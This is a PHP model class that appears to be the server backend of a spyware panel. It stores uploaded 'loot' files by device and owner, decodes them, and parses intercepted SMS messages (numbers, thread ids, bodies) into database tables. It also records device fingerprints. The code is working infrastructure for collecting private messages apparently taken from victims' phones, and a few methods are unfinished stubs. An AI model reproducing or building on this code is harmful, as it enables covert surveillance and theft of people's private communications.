<?php

namespace App\Models;

use CodeIgniter\API\ResponseTrait;

use CodeIgniter\Model;

use App\Models\ModCryption;

class ModUploads extends Model
{
    use ResponseTrait;
    protected $table = "tbl_Loot";

    public function file_upload($data){
        return $this->db->table('tbl_Loot')->insert($data);
    }

    public function loot_last_uploaded(){
        $result = $this->db->table('tbl_Loot')->selectMax('loot_Id')->get();
        return $result->getResult()[0]->loot_Id;
    }

    public function loot_info($loot_id){
        $builder = $this->db->table('tbl_Loot');
        $result = $builder->select('loot_Name, loot_Device, loot_Owner')
            ->where('loot_Id', $loot_id)
            ->get();
        return $result->getResult();
    }

    public function loot_parse_sms($loot_id){
        $mod_cryption = new ModCryption();
        $query_name = $this->db->table('tbl_Loot')->select('loot_Name')
            ->where('loot_Id', $loot_id)->get()->getResult();
        $loot_name = $query_name[0]->loot_Name;
        $loot_file = WRITEPATH."uploads/txt_loot/".$loot_name;

        $loot_data = file_get_contents($loot_file);
        $loot_decoded = $mod_cryption->decode_content($loot_data);
        //echo gettype($loot_decoded);

        $data_dump1 = str_replace("-------(//)--------", "", $loot_decoded);
        $data_dump2 = str_replace("\n", '****', $data_dump1);
        $data_dump3 = str_replace('****"', '"', $data_dump2);
        $data_dump4 = "[".substr($data_dump3, 0, -2)."}]";

        $data = json_encode($data_dump4);
        $data1 = json_decode($data);
        $data2 = json_decode($data1);

        foreach ($data2 as $smsdata) {

            $thread_id = 'Thread Id';
            $data = array(
                'sms_type' => $smsdata->Type,
                'sms_number' => $smsdata->Number,
                'sms_thread_id' => $smsdata->$thread_id,
                'sms_time' => $smsdata->Date,
                'sms_seen' => $smsdata->Seen,
                'sms__id' => $smsdata->ID,
                'sms_body' => $smsdata->Body,
                'meta_uploaded' => time(),
                'meta_seen' => '0',
                'meta_owner' => 020,
                'meta_Print' => 010,
            );
            $this->db ->table('tbl_Sms')->insert($data);
        }
    }

    public function file_listing(){
        return $this->db->table('tbl_Loot')->get()->getResult();
    }

    public function file_delete($userid){
        $table = 'tbl_users';
    }

    public function device_check_print($print_dump){
        $builder = $this->db->table('tbl_Print');
        $get_all = $builder->select('p_Id')
                ->where($print_dump)
                ->get();
        return $get_all->getResult();
    }
    
    public function device_make_print($print_dump){
        return $this->db->table('tbl_Print')->insert($print_dump);
    }
}
